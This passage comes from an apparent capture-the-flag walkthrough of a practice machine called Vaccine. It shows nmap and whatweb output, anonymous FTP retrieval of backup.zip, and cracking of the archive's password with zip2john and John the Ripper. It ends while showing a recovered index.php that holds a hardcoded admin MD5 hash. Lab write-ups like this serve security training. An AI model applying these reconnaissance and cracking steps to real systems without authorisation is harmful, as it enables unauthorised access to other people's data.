</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>4</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_-rwxr-xr-x    <span class=m>1</span> <span class=m>0</span>        <span class=m>0</span>            <span class=m>2533</span> Apr <span class=m>13</span>  <span class=m>2021</span> backup.zip
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> c0ee58077534b00b9165b259569527a4 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> ac6e81188922d7a7417d814f1bb8b251 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 425bc321dfefa20bc95e03421d69d028 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: MegaCorp Login
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.30 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Couple of things that may stand out at first look:</p><ul><li><em><strong>ftp</strong></em> <strong>anonymous/guest</strong> login is allowed</li><li>there is a file <em>backup.zip</em> which we can access via <em><strong>ftp</strong></em></li><li><em><strong>ssh</strong></em> version is 1:8.0p1-6ubuntu0.1</li><li>apache webserver is running with version &lsquo;Apache httpd 2.4.41&rsquo;</li><li>running os is probably Ubuntu 19.10 - Eoan Ermine</li></ul><p>We continue with a quick <strong>fingerprinting</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>http://10.129.94.247 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.41<span class=o>]</span>, Cookies<span class=o>[</span>PHPSESSID<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.129.94.247<span class=o>]</span>, PasswordField<span class=o>[</span>password<span class=o>]</span>, Title<span class=o>[</span>MegaCorp Login<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><blockquote><p>ftp</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>This service can be configured to allow login with any password for specific username. What is that username?</em></p><p>Since <strong>anonymous login</strong> is enabled on the <em><strong>ftp</strong></em> server, we check it out and proceed <strong>downloading</strong> the <strong>file</strong> we spotted earlier (in TASK1).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ftp <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Connected to 10.129.94.247.
</span></span><span class=line><span class=cl><span class=m>220</span> <span class=o>(</span>vsFTPd 3.0.3<span class=o>)</span>
</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.129.94.247:root<span class=o>)</span>: anonymous
</span></span><span class=line><span class=cl><span class=m>331</span> Please specify the password.
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl><span class=m>230</span> Login successful.
</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
</span></span><span class=line><span class=cl>Using binary mode to transfer files.
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful. Consider using PASV.
</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
</span></span><span class=line><span class=cl>-rwxr-xr-x    <span class=m>1</span> <span class=m>0</span>        <span class=m>0</span>            <span class=m>2533</span> Apr <span class=m>13</span>  <span class=m>2021</span> backup.zip
</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
</span></span><span class=line><span class=cl>ftp&gt; get backup.zip
</span></span><span class=line><span class=cl>local: backup.zip remote: backup.zip
</span></span><span class=line><span class=cl><span class=m>200</span> PORT <span class=nb>command</span> successful. Consider using PASV.
</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> backup.zip <span class=o>(</span><span class=m>2533</span> bytes<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>2533</span> bytes received in 0.00 secs <span class=o>(</span>1.6289 MB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>ftp&gt; <span class=nb>exit</span>
</span></span><span class=line><span class=cl><span class=m>221</span> Goodbye.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><blockquote><p>anonymous</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the name of the file downloaded over this service?</em></p><p>Simply trying to <strong>decompress</strong> it does not work as it is <strong>password</strong> protected.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 4.0K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 2.5K May <span class=m>18</span> 03:17 backup.zip
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ unzip backup.zip 
</span></span><span class=line><span class=cl>Archive:  backup.zip
</span></span><span class=line><span class=cl><span class=o>[</span>backup.zip<span class=o>]</span> index.php password: 
</span></span><span class=line><span class=cl>password incorrect--reenter: 
</span></span><span class=line><span class=cl>password incorrect--reenter: 
</span></span><span class=line><span class=cl>   skipping: index.php               incorrect password
</span></span><span class=line><span class=cl><span class=o>[</span>backup.zip<span class=o>]</span> style.css password: 
</span></span><span class=line><span class=cl>password incorrect--reenter: 
</span></span><span class=line><span class=cl>password incorrect--reenter: 
</span></span><span class=line><span class=cl>   skipping: style.css               incorrect password
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><blockquote><p>backup.zip</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?</em></p><p>A quick <strong>online search</strong> leaves us with <strong>two</strong> potential <strong>candidates</strong>:</p><ul><li>zip2john</li><li>rar2john</li></ul><p>But given the <strong>extension</strong> of <em>backup.zip</em>, it should be the first one. Now that we <strong>identified</strong> the necessary tools, we get to it.</p><p>First we create the <strong>password hash</strong> which we can later <strong>crack</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ man john
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ zip2john backup.zip &gt; backupzip.hash
</span></span><span class=line><span class=cl>Created directory: /home/htb-bluewalle/.john
</span></span><span class=line><span class=cl>ver 2.0 efh <span class=m>5455</span> efh <span class=m>7875</span> backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, <span class=nv>cmplen</span><span class=o>=</span>1201, <span class=nv>decmplen</span><span class=o>=</span>2594, <span class=nv>crc</span><span class=o>=</span>3A41AE06
</span></span><span class=line><span class=cl>ver 2.0 efh <span class=m>5455</span> efh <span class=m>7875</span> backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, <span class=nv>cmplen</span><span class=o>=</span>986, <span class=nv>decmplen</span><span class=o>=</span>3274, <span class=nv>crc</span><span class=o>=</span>1B1CCD6A
</span></span><span class=line><span class=cl>NOTE: It is assumed that all files in each archive have the same password.
</span></span><span class=line><span class=cl>If that is not the <span class=k>case</span>, the <span class=nb>hash</span> may be uncrackable. To avoid this, use
</span></span><span class=line><span class=cl>option -o to pick a file at a time.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 8.0K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 2.5K May <span class=m>18</span> 03:17 backup.zip
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 2.2K May <span class=m>18</span> 03:20 backupzip.hash
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>This is how the resulting <strong>password hash</strong> looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat backupzip.hash 
</span></span><span class=line><span class=cl>backup.zip:<span class=nv>$pkzip2$2</span>*2*1*0*8*24*3a41*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*1b1c*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip2$::backup.zip:style.css, index.php:backup.zip
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>So now it&rsquo;s time to finally get <strong>cracking</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ john backupzip.hash 
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>PKZIP <span class=o>[</span>32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Proceeding with single, rules:Single
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>Warning: Only <span class=m>5</span> candidates buffered <span class=k>for</span> the current salt, minimum <span class=m>8</span> needed <span class=k>for</span> performance.
</span></span><span class=line><span class=cl>Warning: Only <span class=m>4</span> candidates buffered <span class=k>for</span> the current salt, minimum <span class=m>8</span> needed <span class=k>for</span> performance.
</span></span><span class=line><span class=cl>Almost <span class=k>done</span>: Processing the remaining buffered candidate passwords, <span class=k>if</span> any.
</span></span><span class=line><span class=cl>Warning: Only <span class=m>6</span> candidates buffered <span class=k>for</span> the current salt, minimum <span class=m>8</span> needed <span class=k>for</span> performance.
</span></span><span class=line><span class=cl>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
</span></span><span class=line><span class=cl><span class=m>741852963</span>        <span class=o>(</span>backup.zip<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE 2/3 <span class=o>(</span>2023-05-18 03:21<span class=o>)</span> 11.11g/s 844766p/s 844766c/s 844766C/s 123456..ferrises
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ john --show backupzip.hash 
</span></span><span class=line><span class=cl>backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>1</span> password <span class=nb>hash</span> cracked, <span class=m>0</span> left
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p><em><strong>Unzipping</strong></em> the <em>backup.zip</em> file with the <strong>password</strong> we just found - <em>741852963</em> - will provide us with <strong>two source files</strong>:</p><ul><li>index.php</li><li>style.css</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ unzip backup.zip 
</span></span><span class=line><span class=cl>Archive:  backup.zip
</span></span><span class=line><span class=cl><span class=o>[</span>backup.zip<span class=o>]</span> index.php password: 
</span></span><span class=line><span class=cl>  inflating: index.php               
</span></span><span class=line><span class=cl>  inflating: style.css               
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Let&rsquo;s check them out.</p><p>- <em>index.php</em> -</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat index.php 
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>session_start<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=o>(</span>isset<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;username&#39;</span><span class=o>])</span> <span class=o>&amp;&amp;</span> isset<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;password&#39;</span><span class=o>]))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;username&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;admin&#39;</span> <span class=o>&amp;&amp;</span> md5<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;password&#39;</span><span class=o>])</span> <span class=o>===</span> <span class=s2>&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$_SESSION</span><span class=o>[</span><span class=s1>&#39;login&#39;</span><span class=o>]</span> <span class=o>=</span> <span class=s2>&#34;true&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      header<span class=o>(</span><span class=s2>&#34;Location: dashboard.php&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>&lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span> &gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>  &lt;meta <span class=nv>charset</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span>&gt;
</span></span><span class=line><span class=cl>  &lt;title&gt;MegaCorp Login&lt;/title&gt;
</span></span><span class=line><span class=cl>  &lt;link <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;https://fonts.googleapis.com/css?family=Open+Sans:400,700&#34;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span>&gt;&lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;./style.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>  &lt;h1 <span class=nv>align</span><span class=o>=</span>center&gt;MegaCorp Login&lt;/h1&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;!-- partial:index.partial.html --&gt;
</span></span><span class=line><span class=cl>&lt;body <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  &lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;grid&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &lt;form <span class=nv>action</span><span class=o>=</span><span class=s2>&#34;&#34;</span> <span class=nv>method</span><span class=o>=</span><span class=s2>&#34;POST&#34;</span> <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;form login&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      &lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;form__field&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;label <span class=k>for</span><span class=o>=</span><span class=s2>&#34;login__username&#34;</span>&gt;&lt;svg <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;icon&#34;</span>&gt;&lt;use xmlns:xlink<span class=o>=</span><span class=s2>&#34;http://www.w3.org/1999/xlink&#34;</span> xlink:href<span class=o>=</span><span class=s2>&#34;#user&#34;</span>&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;hidden&#34;</span>&gt;Username&lt;/span&gt;&lt;/label&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;login__username&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;username&#34;</span> <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;form__input&#34;</span> <span class=nv>placeholder</span><span class=o>=</span><span class=s2>&#34;Username&#34;</span> required&gt;
</span></span><span class=line><span class=cl>      &lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      &lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;form__field&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;label <span class=k>for</span><span class=o>=</span><span class=s2>&#34;login__password&#34;</span>&gt;&lt;svg <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;icon&#34;</span>&gt;&lt;use xmlns:xlink<span class=o>=</span><span class=s2>&#34;http://www.w3.org/1999/xlink&#34;</span> xlink:href<span class=o>=</span><span class=s2>&#34;#lock&#34;</span>&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;hidden&#34;</span>&gt;Password&lt;/span&gt;&lt;/label&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;login__password&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;password&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;password&#34;</span> <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;form__input&#34;</span> <span class=nv>placeholder</span><span class=o>=</span><span class=s2>&#34;Password&#34;</span> required&gt;
</span></span><span class=line><span class=cl>      &lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      &lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;form__field&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;Sign In&#34;</span>&gt;
</span></span><span class=line><span class=cl>      &lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &lt;/form&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  &lt;/div&gt;
</span></span><span class=line><span class=cl>
